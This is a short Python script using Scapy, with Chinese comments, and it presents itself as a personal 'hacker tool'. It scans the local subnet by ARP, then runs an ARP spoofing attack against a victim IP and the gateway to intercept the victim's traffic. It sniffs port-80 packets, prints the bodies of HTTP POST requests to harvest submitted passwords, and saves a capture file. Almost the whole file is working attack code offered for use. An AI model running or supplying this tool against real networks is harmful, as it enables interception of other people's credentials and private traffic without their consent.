#author：bdb0y

from scapy.all import *
import time
from threading import Thread
import os
import re
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
wg=''
wifi='Intel(R) Dual Band Wireless-AC 3160'
#result=[]
#定义变量和函数
def scan():
	global wg
	global wifi
	global result
	for line in os.popen("route print"):
		s=line.strip()
		if s.startswith("0.0.0.0"):	
			slist=s.split()
			ip=slist[3]
			wg=slist[2]
			break
	print("本机上网的ip：",ip)
	print("本机上网的网关：",wg)
	tnet=wg+"/24"
	#wifi="Intel(R) Dual Band Wireless-AC 3160"
	p=Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=tnet)
	ans,unans=srp(p,iface=wifi,timeout=2,verbose=0)
	print("一共扫描到了%d个主机"%len(ans))
	result=[]
	for s,r in ans:
		result.append([r.psrc,r.hwsrc])
	result.sort()
	for ip,mac in result:
		print(ip,"--->",mac)
		
#scan()

#解读密码
def showpwd(p):
	try:
		if p.haslayer(Raw):	
			data=p.load.decode(encoding="utf-8",errors='ignore')
			if data.startswith("POST"):
				print(time.strftime("%Y%m%d %H:%M:%S"))	
				head,txt=data.split("\r\n\r\n")
				hlist=head.split("\r\n")
				path=hlist[0].split()[1]
				for line in hlist[1:]:
					if line.startswith("Host"):
						host=line.split()[-1]
					break
				url="http://"+host+path
				print(url)
				print(txt)
	except Exception as e:
		print(e)

#抓包
def capture(target,t):
	tj="tcp port 80 and host "+target
	pkts=sniff(iface=wifi,filter=tj,prn=showpwd,timeout=t)
	fname="p%d.pcap"%int(time.time())
	wrpcap(fname,pkts)
	print("数据已存入文件%s"%fname)

#arp攻击
def spoof():
	vic=input("请输入攻击目标")
	t=int(input("请输入攻击时间(单位/秒)"))
	ct=Thread(target=capture,args=(vic,t))
	ct.start()
	
	for i in range(5*int(t)):
		sendp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=vic,psrc=wg),verbose=0)
		sendp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=wg,psrc=vic),verbose=0)
		time.sleep(0.2)
	ct.join()
	print("攻击结束")

#流量分析
#def analyse():
	

def main():
	print("欢迎使用我的黑客工具")
	while 1:
		sel=input("请选择要进行的操作：\n\t1.局域网扫描\n\t2.ARP欺骗\n\t3.流量分析\n\t4.退出\n")
		if sel=="1":
			#os.system("cls")
			scan()
		elif sel=="2":
			if not wg:
				print("请先执行扫描程序")
			else:
				spoof()
		elif sel=="3":
			print("功能待开发")
			time.sleep(1)
		elif sel=="4":
			print("欢迎下次使用，再见！！！")
			break
		else:
			print("输入有误")
	
if __name__=="__main__":
	main()